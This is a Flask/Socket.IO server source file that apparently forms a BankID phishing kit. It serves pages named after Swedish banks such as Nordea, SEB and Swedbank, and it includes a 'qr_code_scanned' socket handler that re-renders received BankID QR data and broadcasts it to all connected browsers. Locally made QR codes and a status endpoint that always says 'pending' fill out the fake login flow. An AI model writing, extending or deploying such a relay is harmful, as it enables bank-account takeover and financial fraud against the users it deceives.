from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO
import qrcode, base64, hmac, hashlib, time, uuid, json, os
from io import BytesIO

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins='*')

session_data = {}

@app.route('/')
def index():
    return render_template("index.html")

@app.route('/danske.html')
def danske():
    return render_template('danske.html')

@app.route('/handelsbanken.html')
def handelsbanken():
    return render_template('handelsbanken.html')

@app.route('/ica.html')
def ica():
    return render_template('ica.html')

@app.route('/lansforsakringar.html')
def lansforsakringar():
    return render_template('lansforsakringar.html')

@app.route('/nordea.html')
def nordea():
    return render_template('nordea.html')

@app.route('/seb.html')
def seb():
    return render_template('seb.html')

@app.route('/skandiabanken.html')
def skandiabanken():
    return render_template('skandiabanken.html')

@app.route('/sparbanken.html')
def sparbanken():
    return render_template('sparbanken.html')

@app.route('/swedbank.html')
def swedbank():
    return render_template('swedbank.html')

@app.route('/generate_bankid_qr', methods=['POST'])
def generate_bankid_qr():
    session_id = request.form.get('session_id', str(uuid.uuid4()))
    
    if session_id not in session_data:
        qr_start_token = str(uuid.uuid4())
        qr_start_secret = str(uuid.uuid4())
        order_time = time.time()
        
        session_data[session_id] = {
            'qr_start_token': qr_start_token,
            'qr_start_secret': qr_start_secret,
            'order_time': order_time,
            'created_at': time.time()
        }
    
    qr_data = session_data[session_id]
    
    qr_time = str(int(time.time() - qr_data['order_time']))
    
    qr_auth_code = hmac.new(
        qr_data['qr_start_secret'].encode(), 
        qr_time.encode(), 
        hashlib.sha256
    ).hexdigest()
    
    bankid_qr_data = f"bankid.{qr_data['qr_start_token']}.{qr_time}.{qr_auth_code}"
    
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    
    qr.add_data(bankid_qr_data)
    qr.make(fit=True)
    qr_img = qr.make_image(fill_color="black", back_color="white")
    
    buffered = BytesIO()
    qr_img.save(buffered, format="PNG")
    img_base64 = base64.b64encode(buffered.getvalue()).decode('utf-8')
    
    return json.dumps({
        'qr_image': img_base64, 
        'qr_code_data': bankid_qr_data,
        'autostarttoken': qr_data['qr_start_token'],
        'session_id': session_id
    })

@socketio.on('qr_code_scanned')
def handle_qr_code(data):
    qr_data = data['data']
    print(f"[Debug] QR code received: {qr_data}")
    
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    
    qr.add_data(qr_data)
    qr.make(fit=True)
    qr_img = qr.make_image(fill_color="black", back_color="white")
    
    buffered = BytesIO()
    qr_img.save(buffered, format="PNG")
    img_base64 = base64.b64encode(buffered.getvalue()).decode('utf-8')
    
    token = qr_data
    if '.' in qr_data and qr_data.startswith('bankid.'):
        parts = qr_data.split('.')
        if len(parts) == 4:
            token = parts[1]
            print(f"[Debug] Extracted BankID token from QR data: {token}")
    
    socketio.emit("update_qr_code_image", {
        'qr_image': img_base64,
        'qr_code_data': qr_data,
        'autostarttoken': token
    })
    
    socketio.emit("bankid_token", {'token': token})

@socketio.on('request_qr_data')
def handle_request_qr_data():
    session_id = str(uuid.uuid4())
    
    qr_start_token = str(uuid.uuid4())
    qr_start_secret = str(uuid.uuid4())
    order_time = time.time()
    
    session_data[session_id] = {
        'qr_start_token': qr_start_token,
        'qr_start_secret': qr_start_secret,
        'order_time': order_time,
        'created_at': time.time()
    }
    
    qr_time = "0"
    
    qr_auth_code = hmac.new(
        qr_start_secret.encode(), 
        qr_time.encode(), 
        hashlib.sha256
    ).hexdigest()
    
    bankid_qr_data = f"bankid.{qr_start_token}.{qr_time}.{qr_auth_code}"
    
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    
    qr.add_data(bankid_qr_data)
    qr.make(fit=True)
    qr_img = qr.make_image(fill_color="black", back_color="white")
    
    buffered = BytesIO()
    qr_img.save(buffered, format="PNG")
    img_base64 = base64.b64encode(buffered.getvalue()).decode('utf-8')
    
    socketio.emit("update_qr_code_image", {
        'qr_image': img_base64, 
        'qr_code_data': bankid_qr_data,
        'autostarttoken': qr_start_token,
        'session_id': session_id
    })
    
    socketio.emit('qr_data', {'qrData': qr_start_token, 'session_id': session_id})
    
    return {'session_id': session_id, 'token': qr_start_token}

@socketio.on('request_fresh_qr_data')
def handle_fresh_qr_data_request():
    return handle_request_qr_data()

@socketio.on('connect')
def handle_connect():
    current_time = time.time()
    expired_sessions = []
    
    for session_id, data in session_data.items():
        if current_time - data['created_at'] > 600:
            expired_sessions.append(session_id)
    
    for session_id in expired_sessions:
        del session_data[session_id]

@socketio.on('start_qr_animation')
def handle_start_qr_animation(data):
    session_id = data.get('session_id')
    if not session_id or session_id not in session_data:
        return handle_request_qr_data()
    
    qr_data = session_data[session_id]
    
    qr_time = str(int(time.time() - qr_data['order_time']))
    
    qr_auth_code = hmac.new(
        qr_data['qr_start_secret'].encode(), 
        qr_time.encode(), 
        hashlib.sha256
    ).hexdigest()
    
    bankid_qr_data = f"bankid.{qr_data['qr_start_token']}.{qr_time}.{qr_auth_code}"
    
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    
    qr.add_data(bankid_qr_data)
    qr.make(fit=True)
    qr_img = qr.make_image(fill_color="black", back_color="white")
    
    buffered = BytesIO()
    qr_img.save(buffered, format="PNG")
    img_base64 = base64.b64encode(buffered.getvalue()).decode('utf-8')
    
    socketio.emit("update_qr_code_image", {
        'qr_image': img_base64, 
        'qr_code_data': bankid_qr_data,
        'autostarttoken': qr_data['qr_start_token'],
        'session_id': session_id
    })

@app.route('/api/bankid/start', methods=['POST'])
def start_bankid():
    data = request.json or {}
    return_url = data.get('returnUrl', request.referrer or request.url_root)
    
    nonce = str(uuid.uuid4()).replace('-', '')[:16]
    
    session_id = str(uuid.uuid4())
    
    qr_start_token = str(uuid.uuid4())
    qr_start_secret = str(uuid.uuid4())
    
    session_data[session_id] = {
        'qr_start_token': qr_start_token,
        'qr_start_secret': qr_start_secret,
        'order_time': time.time(),
        'created_at': time.time(),
        'return_url': return_url,
        'nonce': nonce
    }
    
    platform = data.get('platform', 'unknown')
    
    response_data = {
        'session_id': session_id,
        'autostart_token': qr_start_token,
        'nonce': nonce
    }
    
    if platform == 'ios':
        response_data['autostart_url'] = f"https://app.bankid.com/?autostarttoken={qr_start_token}&redirect=null"
    elif platform == 'android':
        response_data['autostart_url'] = f"https://app.bankid.com/?autostarttoken={qr_start_token}&redirect=null"
    else:
        response_data['autostart_url'] = f"bankid:///?autostarttoken={qr_start_token}"
    
    return jsonify(response_data)

@app.route('/api/bankid/qrcode/<session_id>')
def get_qr_code_by_session(session_id):
    if session_id not in session_data:
        return jsonify({'error': 'Session not found'}), 404
    
    qr_data = session_data[session_id]
    
    qr_time = str(int(time.time() - qr_data['order_time']))
    
    qr_auth_code = hmac.new(
        qr_data['qr_start_secret'].encode(), 
        qr_time.encode(), 
        hashlib.sha256
    ).hexdigest()
    
    bankid_qr_data = f"bankid.{qr_data['qr_start_token']}.{qr_time}.{qr_auth_code}"
    
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    
    qr.add_data(bankid_qr_data)
    qr.make(fit=True)
    qr_img = qr.make_image(fill_color="black", back_color="white")
    
    buffered = BytesIO()
    qr_img.save(buffered, format="PNG")
    img_base64 = base64.b64encode(buffered.getvalue()).decode('utf-8')
    
    return jsonify({
        'qr_image': img_base64,
        'qr_data': bankid_qr_data,
        'autostart_token': qr_data['qr_start_token']
    })

@app.route('/api/bankid/status/<session_id>')
def check_bankid_status(session_id):
    if session_id not in session_data:
        return jsonify({'status': 'error', 'message': 'Session not found'}), 404
    
    return jsonify({
        'status': 'pending',
        'message': 'Waiting for BankID authentication'
    })

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 5000))
    socketio.run(app, host='0.0.0.0', port=port, allow_unsafe_werkzeug=True)